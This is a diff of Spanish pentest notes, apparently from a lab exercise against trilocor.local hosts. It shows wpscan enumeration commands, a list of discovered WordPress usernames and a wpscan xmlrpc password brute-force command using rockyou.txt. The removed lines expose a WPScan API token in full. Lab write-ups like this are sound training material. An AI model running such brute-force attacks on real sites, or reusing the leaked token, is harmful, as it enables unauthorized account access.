@@ -58,9 +58,28 @@ Dentro de las carpetas de Elementor, también se cargan los siguientes component
 
 wpscan encontró: 
 ```
-sudo wpscan --url http://www.trilocor.local/ --enumerate --api-token uaOXAeFwEMjXLL0daf2PKFC8TCmu9xHtQdBv2sfKb4c
+sudo wpscan --url http://www.trilocor.local/ --enumerate --api-token [REDACTED]
 y
-sudo wpscan --url http://admin.trilocor.local/ --enumerate --api-token uaOXAeFwEMjXLL0daf2PKFC8TCmu9xHtQdBv2sfKb4c
+sudo wpscan --url http://admin.trilocor.local/ --enumerate --api-token [REDACTED]
 ```
 
-[[resultado wpscan www]]
+[[resultado wpscan]]
+
+Encuentro esta lista de usuarios: 
+```
+web-admin
+web-editor
+hr-smith
+r.batty
+pr-martins
+trilocor.Emerald
+trilocor.Shiv
+trilocor.Gradin
+trilocor.Vagient
+trilocor.Fankle
+```
+
+Les hago fuerza bruta con wp-scan: 
+```
+wpscan --password-attack xmlrpc -t 20 -U users-wp.txt -P /usr/share/wordlists/rockyou.txt --url http://admin.trilocor.local/ --api-token [REDACTED]
+```
